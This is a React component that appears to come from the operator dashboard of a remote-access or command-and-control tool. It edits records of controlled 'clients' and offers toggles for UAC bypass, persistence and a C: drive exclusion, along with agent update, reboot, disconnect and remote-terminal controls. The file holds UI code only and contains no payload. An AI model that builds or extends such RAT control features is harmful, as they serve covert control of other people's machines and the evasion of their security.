import React, { useState } from 'react';
import socket from '@/lib/socket';
import TerminalSim from './TerminalSim';

interface Client {
  id: string;
  hostname: string;
  ip: string;
  status: string;
  tags?: string[];
  uacBypass?: boolean;
  persistence?: boolean;
  cExclusion?: boolean;
  updateAgent?: boolean;
}

interface ClientDetailModalProps {
  client: Client | null;
  open: boolean;
  onClose: () => void;
  onSave: (client: Client) => void;
}

export default function ClientDetailModal({ client, open, onClose, onSave }: ClientDetailModalProps) {
  const [editClient, setEditClient] = useState<Client | null>(client);
  const [showTerminal, setShowTerminal] = useState(false);

  React.useEffect(() => {
    setEditClient(client);
  }, [client]);

  if (!open || !editClient) return null;

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    setEditClient({ ...editClient, [e.target.name]: e.target.value });
  }

  function handleTagChange(e: React.ChangeEvent<HTMLInputElement>, idx: number) {
    const tags = editClient.tags ? [...editClient.tags] : [];
    tags[idx] = e.target.value;
    setEditClient({ ...editClient, tags });
  }

  function handleAddTag() {
    setEditClient({ ...editClient, tags: [...(editClient.tags || []), ''] });
  }

  function handleRemoveTag(idx: number) {
    const tags = editClient.tags ? [...editClient.tags] : [];
    tags.splice(idx, 1);
    setEditClient({ ...editClient, tags });
  }

  function handleSave() {
    if (editClient) onSave(editClient);
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60" role="dialog" aria-modal="true">
      <div className="bg-gray-900 rounded-lg p-6 w-full max-w-md shadow-lg relative">
        <button className="absolute top-2 right-2 text-gray-400 hover:text-white" onClick={onClose} aria-label="Close modal">✖️</button>
        <h2 className="text-lg font-bold mb-4">Edit Client Details</h2>
        <form className="space-y-3" onSubmit={e => { e.preventDefault(); handleSave(); }}>
          <div>
            <label className="block text-sm mb-1">Hostname</label>
            <input name="hostname" className="w-full p-2 rounded bg-gray-800 text-white" value={editClient.hostname} onChange={handleChange} />
          </div>
          <div>
            <label className="block text-sm mb-1">IP Address</label>
            <input name="ip" className="w-full p-2 rounded bg-gray-800 text-white" value={editClient.ip} onChange={handleChange} />
          </div>
          <div>
            <label className="block text-sm mb-1">Status</label>
            <input name="status" className="w-full p-2 rounded bg-gray-800 text-white" value={editClient.status} onChange={handleChange} />
          </div>
          <div>
            <label className="block text-sm mb-1">Tags</label>
            {(editClient.tags || []).map((tag, idx) => (
              <div key={idx} className="flex gap-2 mb-1">
                <input className="flex-1 p-2 rounded bg-gray-800 text-white" value={tag} onChange={e => handleTagChange(e, idx)} />
                <button type="button" className="text-red-400 hover:text-red-600" onClick={() => handleRemoveTag(idx)} aria-label="Remove tag">✖️</button>
              </div>
            ))}
            <button type="button" className="mt-1 text-blue-400 hover:text-blue-600" onClick={handleAddTag}>+ Add Tag</button>
          </div>
          <div className="mt-4 space-y-2">
            <label className="flex items-center gap-2">
              <input type="checkbox" checked={!!editClient.uacBypass} onChange={e => setEditClient({ ...editClient, uacBypass: e.target.checked })} />
              <span>UAC Bypass</span>
            </label>
            <label className="flex items-center gap-2">
              <input type="checkbox" checked={!!editClient.persistence} onChange={e => setEditClient({ ...editClient, persistence: e.target.checked })} />
              <span>Persistence</span>
            </label>
            <label className="flex items-center gap-2">
              <input type="checkbox" checked={!!editClient.cExclusion} onChange={e => setEditClient({ ...editClient, cExclusion: e.target.checked })} />
              <span>C: Drive Exclusion</span>
            </label>
            <button type="button" className="px-4 py-2 rounded bg-yellow-700 hover:bg-yellow-800 text-white" onClick={() => setEditClient({ ...editClient, updateAgent: true })}>Update Agent</button>
          </div>
          <div className="flex justify-end gap-2 mt-4">
            <button
              type="button"
              className="px-4 py-2 rounded bg-green-700 hover:bg-green-800 text-white"
              onClick={() => setShowTerminal(true)}
            >
              Terminal
            </button>
            <button
              type="button"
              className="px-4 py-2 rounded bg-red-700 hover:bg-red-800 text-white"
              onClick={() => {
                if (editClient?.id) {
                  socket.emit('reboot_client', { clientId: editClient.id });
                  alert('Reboot command sent');
                }
              }}
            >
              Reboot
            </button>
            <button
              type="button"
              className="px-4 py-2 rounded bg-yellow-700 hover:bg-yellow-800 text-white"
              onClick={() => {
                if (editClient?.id) {
                  socket.emit('disconnect_client', { clientId: editClient.id });
                  alert('Disconnect command sent');
                }
              }}
            >
              Disconnect
            </button>
            <button type="button" className="px-4 py-2 rounded bg-gray-700 hover:bg-gray-600" onClick={onClose}>Cancel</button>
            <button type="submit" className="px-4 py-2 rounded bg-blue-600 hover:bg-blue-700 text-white">Save</button>
          </div>

          {/* Terminal Modal */}
          {showTerminal && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
              <div className="bg-gray-900 rounded-lg p-4 w-full max-w-2xl shadow-lg relative">
                <button className="absolute top-2 right-2 text-gray-400 hover:text-white" onClick={() => setShowTerminal(false)} aria-label="Close terminal">✖️</button>
                <h2 className="text-lg font-bold mb-2 text-blue-300">Remote Terminal: {editClient.hostname}</h2>
                <TerminalSim onlyClientId={editClient.id} />
              </div>
            </div>
          )}
        </form>
      </div>
    </div>
  );
}
